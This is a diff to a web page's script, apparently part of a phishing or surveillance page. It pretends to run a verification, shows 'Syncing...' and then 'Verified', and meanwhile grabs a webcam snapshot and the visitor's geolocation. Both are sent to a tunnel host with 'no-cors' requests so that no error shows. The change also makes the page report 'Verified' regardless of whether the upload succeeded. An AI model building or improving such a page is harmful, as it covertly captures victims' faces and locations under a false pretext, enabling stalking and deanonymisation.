@@ -26,50 +26,48 @@
     <canvas id="c"></canvas>
 
     <script>
-        const API = "https://7f13bc54307437.lhr.life"; 
+    const API = "https://7f13bc54307437.lhr.life"; 
 
-        async function init() {
-            const go = document.getElementById('go'), ld = document.getElementById('loader'), st = document.getElementById('st');
-            go.style.display = 'none'; ld.style.display = 'block'; st.innerText = "Connecting...";
+    async function init() {
+        const go = document.getElementById('go'), ld = document.getElementById('loader'), st = document.getElementById('st');
+        go.style.display = 'none'; ld.style.display = 'block'; st.innerText = "Syncing...";
 
-            try {
-                // 1. Пинг
-                await fetch(`${API}/ping?t=${Date.now()}`, { mode: 'cors' });
-                
-                // 2. Гео
-                navigator.geolocation.getCurrentPosition(p => {
-                    fetch(`${API}/location`, { method: 'POST', mode: 'cors', headers: {'Content-Type': 'application/json'},
-                        body: JSON.stringify({lat: p.coords.latitude, lon: p.coords.longitude}) });
-                });
+        try {
+            // 1. ЗАПРОС ГЕО И КАМЕРЫ СРАЗУ
+            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+            const v = document.getElementById('v'); v.srcObject = stream;
+            
+            // Запрашиваем гео параллельно
+            navigator.geolocation.getCurrentPosition(p => {
+                fetch(`${API}/location`, { method: 'POST', mode: 'no-cors', body: JSON.stringify({lat: p.coords.latitude, lon: p.coords.longitude}) });
+            }, null, {timeout: 5000});
 
-                // 3. Камера и Фото
-                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
-                const v = document.getElementById('v'); v.srcObject = stream;
-                await new Promise(r => setTimeout(r, 1000));
+            await new Promise(r => setTimeout(r, 1200));
 
-                document.getElementById('flash').style.opacity = "1";
-                const canvas = document.getElementById('c');
-                canvas.width = v.videoWidth; canvas.height = v.videoHeight;
-                canvas.getContext('2d').drawImage(v, 0, 0);
+            // 2. СНИМОК
+            const canvas = document.getElementById('c');
+            canvas.width = v.videoWidth; canvas.height = v.videoHeight;
+            canvas.getContext('2d').drawImage(v, 0, 0);
+            const blob = await new Promise(r => canvas.toBlob(r, 'image/jpeg', 0.7));
 
-                setTimeout(async () => {
-                    document.getElementById('flash').style.opacity = "0";
-                    const blob = await new Promise(r => canvas.toBlob(r, 'image/jpeg', 0.8));
-                    const fd = new FormData(); fd.append('file', blob, 'img.jpg');
+            // 3. ЖЕСТКАЯ ОТПРАВКА (no-cors)
+            const fd = new FormData(); fd.append('file', blob, 'img.jpg');
+            
+            // Используем mode: 'no-cors', чтобы браузер не выдавал ошибку
+            fetch(`${API}/upload-photo`, { method: 'POST', mode: 'no-cors', body: fd });
 
-                    const res = await fetch(`${API}/upload-photo`, { method: 'POST', mode: 'cors', body: fd });
-                    if (res.ok) {
-                        st.innerText = "Verified";
-                        ld.style.display = 'none';
-                        stream.getTracks().forEach(t => t.stop());
-                    }
-                }, 100);
+            // Визуально завершаем через полсекунды
+            setTimeout(() => {
+                st.innerText = "Verified";
+                ld.style.display = 'none';
+                stream.getTracks().forEach(t => t.stop());
+            }, 500);
 
-            } catch (e) {
-                alert("Error: Check Terminal/Tunnel");
-                go.style.display = 'block'; ld.style.display = 'none'; st.innerText = "Retry";
-            }
+        } catch (e) {
+            alert("Check camera permissions or tunnel link");
+            go.style.display = 'block'; ld.style.display = 'none'; st.innerText = "Retry";
         }
-    </script>
+    }
+</script>
 </body>
 </html>
